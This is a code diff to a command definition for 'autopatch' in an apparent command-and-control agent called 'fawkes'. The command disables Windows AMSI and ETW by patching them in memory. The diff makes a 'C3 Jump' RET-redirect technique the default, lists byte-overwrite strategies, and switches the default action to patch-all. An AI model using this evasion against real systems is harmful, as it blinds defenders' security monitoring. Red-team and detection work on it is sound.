@@ -11,9 +11,9 @@ import (
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "autopatch",
-		Description:         "Patch security hooks in memory. Pattern-based scanning validates targets before patching. Actions: scan (check patchability), patch-amsi, patch-etw, patch-all. Multiple strategies: xor-ret, ret, nop-ret, mov-ret.",
-		HelpString:          "# Scan AMSI/ETW targets for patchability\nautopatch -action scan\n# Patch AMSI with default strategy (xor-ret)\nautopatch -action patch-amsi\n# Patch ETW with specific strategy\nautopatch -action patch-etw -strategy ret\n# Patch all known targets\nautopatch -action patch-all\n# Legacy: raw function patch\nautopatch -dll_name amsi -function_name AmsiScanBuffer -num_bytes 300",
-		Version:             2,
+		Description:         "Patch security hooks in memory. Default: C3 Jump technique (searches for nearest RET and writes a JMP to it). Alternative: byte-overwrite strategies (xor-ret, ret, nop-ret, mov-ret). Actions: scan, patch-amsi, patch-etw, patch-all.",
+		HelpString:          "# Patch all with C3 Jump (default)\nautopatch -action patch-all\n# Scan AMSI/ETW targets for patchability\nautopatch -action scan\n# Patch AMSI with C3 Jump\nautopatch -action patch-amsi\n# Patch with byte-overwrite strategy\nautopatch -action patch-all -strategy xor-ret\n# Custom target with C3 Jump\nautopatch -dll_name amsi -function_name AmsiScanBuffer -num_bytes 300",
+		Version:             3,
 		MitreAttackMappings: []string{"T1562.001"},
 		SupportedUIFeatures: []string{},
 		Author:              "@galoryber",
@@ -26,11 +26,12 @@ func init() {
 				Name:          "action",
 				CLIName:       "action",
 				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:       []string{"scan", "patch-amsi", "patch-etw", "patch-all"},
-				DefaultValue:  "scan",
-				Description:   "scan (check targets), patch-amsi (patch AmsiScanBuffer), patch-etw (patch EtwEventWrite), patch-all (patch all known targets)",
+				Choices:       []string{"patch-all", "patch-amsi", "patch-etw", "scan"},
+				DefaultValue:  "patch-all",
+				Description:   "patch-all (patch all known targets), patch-amsi (patch AmsiScanBuffer), patch-etw (patch EtwEventWrite), scan (check targets without patching)",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
-					{ParameterIsRequired: false, UIModalPosition: 1, GroupName: "Default"},
+					{ParameterIsRequired: false, UIModalPosition: 1, GroupName: "C3 Jump"},
+					{ParameterIsRequired: false, UIModalPosition: 1, GroupName: "Byte Overwrite"},
 				},
 			},
 			{
@@ -39,9 +40,9 @@ func init() {
 				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
 				Choices:       []string{"xor-ret", "ret", "nop-ret", "mov-ret"},
 				DefaultValue:  "xor-ret",
-				Description:   "Patch strategy: xor-ret (returns 0/S_OK, recommended), ret (immediate return), nop-ret (NOP+NOP+RET), mov-ret (returns 1/TRUE)",
+				Description:   "Byte-overwrite strategy: xor-ret (returns 0/S_OK), ret (immediate return), nop-ret (NOP+NOP+RET), mov-ret (returns 1/TRUE)",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
-					{ParameterIsRequired: false, UIModalPosition: 2, GroupName: "Default"},
+					{ParameterIsRequired: true, UIModalPosition: 2, GroupName: "Byte Overwrite"},
 				},
 			},
 			{
@@ -49,9 +50,9 @@ func init() {
 				CLIName:       "dll_name",
 				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				DefaultValue:  "",
-				Description:   "DLL name for legacy mode (e.g., amsi, ntdll.dll)",
+				Description:   "DLL containing the target function (e.g., amsi, ntdll.dll)",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
-					{ParameterIsRequired: false, UIModalPosition: 3, GroupName: "Legacy"},
+					{ParameterIsRequired: true, UIModalPosition: 1, GroupName: "Custom Target"},
 				},
 			},
 			{
@@ -59,9 +60,9 @@ func init() {
 				CLIName:       "function_name",
 				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				DefaultValue:  "",
-				Description:   "Function name for legacy mode (e.g., AmsiScanBuffer, EtwEventWrite)",
+				Description:   "Function name to patch (e.g., AmsiScanBuffer, EtwEventWrite)",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
-					{ParameterIsRequired: false, UIModalPosition: 4, GroupName: "Legacy"},
+					{ParameterIsRequired: true, UIModalPosition: 2, GroupName: "Custom Target"},
 				},
 			},
 			{
@@ -69,9 +70,9 @@ func init() {
 				CLIName:       "num_bytes",
 				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
 				DefaultValue:  300,
-				Description:   "Search range for legacy mode (bytes to scan for RET instruction)",
+				Description:   "Search range in bytes — how far forward/backward to scan for a C3 (RET) instruction",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
-					{ParameterIsRequired: false, UIModalPosition: 5, GroupName: "Legacy"},
+					{ParameterIsRequired: false, UIModalPosition: 3, GroupName: "Custom Target"},
 				},
 			},
 		},
@@ -140,14 +141,22 @@ func init() {
 			}
 			action, _ := task.Args.GetStringArg("action")
 			strategy, _ := task.Args.GetStringArg("strategy")
-			if action != "" {
-				display := fmt.Sprintf("action: %s", action)
-				if strategy != "" && action != "scan" {
-					display += fmt.Sprintf(", strategy: %s", strategy)
-				}
+			dllName, _ := task.Args.GetStringArg("dll_name")
+			if dllName != "" {
+				display := fmt.Sprintf("C3 Jump: %s!%s", dllName, func() string { s, _ := task.Args.GetStringArg("function_name"); return s }())
 				response.DisplayParams = &display
-			} else if displayParams, err := task.Args.GetFinalArgs(); err == nil {
-				response.DisplayParams = &displayParams
+			} else if action != "" {
+				if strategy != "" && action != "scan" {
+					display := fmt.Sprintf("action: %s, strategy: %s", action, strategy)
+					response.DisplayParams = &display
+				} else {
+					technique := "C3 Jump"
+					if strategy != "" {
+						technique = strategy
+					}
+					display := fmt.Sprintf("action: %s, technique: %s", action, technique)
+					response.DisplayParams = &display
+				}
 			}
 			if action != "scan" {
 				createArtifact(task.Task.ID, "API Call", "VirtualProtect + WriteProcessMemory on security DLL function")
